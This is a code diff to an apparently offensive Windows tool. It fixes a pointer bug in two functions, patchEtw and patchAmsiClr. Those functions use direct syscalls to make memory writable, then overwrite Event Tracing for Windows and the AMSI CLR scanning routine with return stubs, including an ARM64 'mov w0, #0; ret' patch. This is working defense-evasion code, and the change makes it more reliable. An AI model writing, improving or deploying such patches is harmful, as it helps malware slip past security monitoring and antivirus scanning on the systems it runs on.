@@ -288,7 +288,8 @@ int static inline patchEtw()
     DWORD oldprotect = 0;
     HANDLE hProcess = GetCurrentProcess();
     SIZE_T dwSize = 1024;
-    Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, PAGE_READWRITE, &oldprotect);
+    void * protectBase = pEventWrite;
+    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, PAGE_READWRITE, &oldprotect);
 
     #if defined(_M_ARM64) || defined(__aarch64__)
         char patch[] = "\x00\x00\x80\x52\xc0\x03\x5f\xd6"; // mov w0, #0; ret
@@ -305,7 +306,7 @@ int static inline patchEtw()
 
     FlushInstructionCache(GetCurrentProcess(), pEventWrite, patchSize);
 
-    Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, oldprotect, &oldprotect);
+    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, oldprotect, &oldprotect);
 
     return 0;
 }
@@ -454,13 +455,14 @@ int static inline patchAmsiClr()
     DWORD oldprotect = 0;
     HANDLE hProcess = GetCurrentProcess();
     SIZE_T dwSize = 1024;
-    Sw3NtProtectVirtualMemory_(hProcess, &found, &dwSize, PAGE_READWRITE, &oldprotect);
+    void * protectBase = found;
+    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, PAGE_READWRITE, &oldprotect);
     
     WriteProcessMemory(hProcess, found, (PVOID)NewBytes, 14, nullptr);
 
     FlushInstructionCache(GetCurrentProcess(), found, 14);
 
-    Sw3NtProtectVirtualMemory_(hProcess, &found, &dwSize, oldprotect, &oldprotect);
+    Sw3NtProtectVirtualMemory_(hProcess, &protectBase, &dwSize, oldprotect, &oldprotect);
 
     return 0;
 }
